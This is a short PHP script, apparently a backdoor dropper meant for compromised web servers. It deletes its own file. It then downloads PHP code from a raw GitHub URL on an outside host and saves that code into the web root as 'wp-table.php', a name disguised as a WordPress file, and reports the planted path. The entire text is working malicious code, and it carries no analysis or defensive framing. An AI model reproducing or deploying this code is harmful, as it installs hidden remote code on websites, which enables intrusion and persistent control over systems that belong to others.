<?php
unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://raw.githubusercontent.com/credhandter/reormoun/refs/heads/main/l1/fCTlM8q9.php');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$c = curl_exec($ch);
if (strpos($c, '<?php')===false)  die('err dl');
if (is_file($_SERVER['DOCUMENT_ROOT'].'/wp-table.php')) die('file exist');
$r = file_put_contents($_SERVER['DOCUMENT_ROOT'].'/wp-table.php', $c);
if ($r===false) die('err saving');
die('/wp-table.php');